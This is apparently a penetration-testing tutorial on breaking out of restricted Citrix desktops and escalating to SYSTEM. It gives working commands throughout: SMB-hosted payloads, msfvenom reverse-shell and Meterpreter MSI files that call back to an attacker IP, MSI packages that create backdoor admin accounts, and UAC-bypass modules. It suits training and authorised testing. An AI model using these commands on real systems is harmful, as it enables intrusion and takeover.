## Citrix Breakout

A Citrix or restricted desktop breakout follows a three-stage process: obtain a Windows dialog box, use it to navigate to or execute a shell binary, then escalate from that shell to higher privileges.  The restrictions enforced by Group Policy affect the Windows shell and File Explorer but rarely extend to every file picker dialog exposed by every application deployed in the environment. 

***

## Stage 1: Obtaining a Dialog Box

Any application with File > Open, Save As, Print, Browse, Import, or Export functionality provides a Windows common dialog box. 

### Applications Commonly Available in Citrix Environments

```
Paint       -> File > Open
Notepad     -> File > Open
Wordpad     -> File > Open
Microsoft Office (Word/Excel) -> File > Open
Internet Explorer/Edge -> Ctrl+O or address bar
Help viewer -> click any documentation link
Sticky Notes -> will not work but most MS apps will
```

### Keyboard Shortcuts That Open Dialogs Without Menus

```
Win+R          -> Run dialog (if not blocked)
Ctrl+O         -> Open dialog in most applications
F1             -> Help (help viewer links can lead to a browser or file system)
Ctrl+Alt+End   -> Windows Security dialog in RDP sessions
Alt+Home       -> Start Menu (in some RDP/Citrix configs)
Shift+F10      -> Context menu (right-click equivalent)
```

***

## Stage 2: Navigating to a Shell via the Dialog Box

Once a dialog box is open, the File Name field accepts paths directly, bypassing Explorer restrictions: 

### Bypassing Path Restrictions

```
In the "File name" field of any open/save dialog, type:

C:\Windows\System32           <- navigate directly to system executables
C:\Users\pmorgan              <- user's home directory  
\\127.0.0.1\c$\Users          <- UNC path bypasses folder restrictions
\\127.0.0.1\c$\Windows\System32\cmd.exe   <- direct path to shell
```

### Bypassing File Type Filters

```
If the dialog only shows *.txt or *.docx, override by typing in the File Name field:

*.*                           <- show all file types
*.exe                         <- show only executables
*                             <- show everything
```

### Accessing an Attacker-Hosted SMB Share

```bash
# Start SMB server on attack machine
smbserver.py -smb2support share $(pwd)
# Or with authentication:
smbserver.py -smb2support -username user -password pass share $(pwd)

# In Citrix dialog box File Name field:
\\10.10.14.3\share

# Right-click your payload binary -> Open -> executes in Citrix context
```

### Executing a Shell via the Dialog

```
Method 1: Navigate to C:\Windows\System32 -> find cmd.exe -> right-click -> Open

Method 2: Type directly into address bar of dialog:
C:\Windows\System32\cmd.exe

Method 3: Type UNC path to your hosted payload:
\\10.10.14.3\share\shell.exe  -> right-click -> Open
```

***

## Stage 3: Escalating from Restricted CMD

Once CMD is obtained, normal Windows privilege escalation techniques apply. In Citrix environments, `AlwaysInstallElevated` is a common misconfiguration because administrators set it to allow software deployment without prompting users. [

### AlwaysInstallElevated - Explained

When both HKCU and HKLM registry keys are set to `1`, any user can run any `.msi` file and it installs with `NT AUTHORITY\SYSTEM` privileges, bypassing UAC entirely: 
```cmd
:: Check if AlwaysInstallElevated is enabled
:: Both keys must be 1 for the exploit to work
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 0x1 on both = vulnerable
```

```powershell
# PowerUp detection and exploitation
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated    # Check if vulnerable
Invoke-AllChecks                     # Full check

# Create malicious MSI that adds backdoor admin user
Write-UserAddMSI
# Creates UserAdd.msi on Desktop

# Execute MSI - runs as SYSTEM, adds user to Administrators
msiexec /quiet /qn /i UserAdd.msi
# Then set username=backdoor password=T3st@123 in the GUI prompt
```

```bash
# Manual MSI payload generation on attack machine
# Option 1: Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f msi -o shell.msi

# Option 2: Add local admin via MSI
msfvenom -p windows/exec CMD='net localgroup administrators hacker /add && net user hacker Pass1!' -f msi -o adduser.msi

# Option 3: Meterpreter MSI
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f msi -o meter.msi
```

```cmd
:: Execute MSI on target
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
:: /quiet = no user interaction
:: /qn = no GUI at all
:: /i = install package

:: Verify user was created
net localgroup administrators
```

***

## Bypassing UAC After Gaining Admin Membership

Even if you add yourself to Administrators, UAC will block access to privileged paths and operations until bypassed: 
```powershell
# FuzzySecurity Bypass-UAC module - multiple methods
Import-Module .\Bypass-UAC.ps1

Bypass-UAC -Method UacMethodSysprep      # sysprep DLL hijack
Bypass-UAC -Method UacMethodMMC2        # MMC.exe COM elevation
Bypass-UAC -Method UacMethodInetMgr     # InetMgr.exe
Bypass-UAC -Method UacMethodEnvVar      # Environment variable abuse

# Verify elevated context after bypass
whoami /priv
# Should show: SeDebugPrivilege, SeTakeOwnershipPrivilege etc. enabled
```

***

## Alternative Breakout Techniques

### Alternate File Explorers (Bypass Folder Restrictions)

```
Explorer++ - portable, no install needed, bypasses GPO folder restrictions
Q-Dir      - quad-pane explorer, also bypasses some GPO restrictions

Transfer via SMB: \\10.10.14.3\share\ExplorerPlusPlus.exe -> Open -> runs from share
Then use Explorer++ to copy files, navigate to C:\Windows\System32, launch cmd.exe
```

### Alternate Registry Editors (When regedit.exe is Blocked)

```
SimpleRegedit      - sourceforge.net/projects/simpregedit
Uberregedit        - sourceforge.net/projects/uberregedit
SmallRegistryEditor - sourceforge.net/projects/sre

Use these to: read AutoLogon passwords, check AlwaysInstallElevated, modify run keys
```

### Shortcut File Modification

```
1. Right-click any existing shortcut -> Properties
2. In the Target field, replace the existing path with:
   C:\Windows\System32\cmd.exe
3. Click OK -> double-click the shortcut -> cmd spawns
```

### Script File Execution

```batch
:: Create evil.bat
:: Method 1: rename a .txt file to .bat in a dialog Save As
:: Method 2: transfer via SMB share and open

:: Contents of evil.bat:
cmd

:: Or for PowerShell:
powershell -ExecutionPolicy Bypass -NoProfile
```

***

## Full Breakout Flow

```
Land in restricted Citrix desktop
         |
         v
Open an application: Paint, Notepad, Wordpad, any Office app
File > Open -> Windows dialog box appears
         |
         v
In File Name field type: C:\Windows\System32
Change file type to: All Files (*.*)
Navigate to cmd.exe -> right-click -> Open
         |
         v
If cmd.exe is restricted (filtered by path):
Host payload on SMB: smbserver.py -smb2support share $(pwd)
In dialog: \\10.10.14.3\share -> Open pwn.exe
         |
         v
CMD obtained. Check privileges:
whoami /priv
whoami /groups
         |
         v
Check AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
         |
Both = 0x1?
  YES -> Import-Module .\PowerUp.ps1 -> Write-UserAddMSI
         msiexec /quiet /qn /i UserAdd.msi
         runas /user:backdoor cmd
         Bypass-UAC -Method UacMethodSysprep
         whoami /all -> SYSTEM privileges confirmed
         |
  NO  -> Run winPEAS / PowerUp for other vectors
         Check unquoted paths, weak service permissions, kernel exploits
```
